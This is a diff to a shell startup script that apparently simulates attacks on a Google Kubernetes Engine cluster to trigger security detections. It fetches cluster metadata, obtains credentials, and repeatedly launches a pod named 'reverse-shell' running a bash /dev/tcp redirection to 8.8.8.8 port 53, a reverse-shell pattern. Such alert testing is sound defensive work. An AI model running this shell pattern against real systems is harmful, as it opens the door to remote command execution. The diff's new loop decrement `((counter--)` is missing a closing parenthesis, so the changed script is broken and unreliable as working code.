@@ -26,7 +26,8 @@ apt-get install kubectl -y
 apt-get install google-cloud-sdk-gke-gcloud-auth-plugin -y
  CLUSTER_NAME=$(curl "http://metadata.google.internal/computeMetadata/v1/instance/attributes/CLUSTER_NAME" -H "Metadata-Flavor: Google")
  PROJ_ID=$(curl "http://metadata.google.internal/computeMetadata/v1/instance/attributes/PROJ_ID" -H "Metadata-Flavor: Google")
-while true
+counter=10
+while [ $counter -gt 0 ];
 do
     export USE_GKE_GCLOUD_AUTH_PLUGIN=True
     gcloud container clusters get-credentials $CLUSTER_NAME --zone=us-east1 --project=$PROJ_ID
@@ -38,5 +39,5 @@ do
     tag2="reverse-shell-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
     kubectl run --restart=Never --rm=true -i --image marketplace.gcr.io/google/ubuntu1804:latest "$tag2" -- bash -c "/bin/echo >& /dev/tcp/8.8.8.8/53 0>&1"
     sleep 60
-    sudo google_metadata_script_runner startup
+    ((counter--)
 done
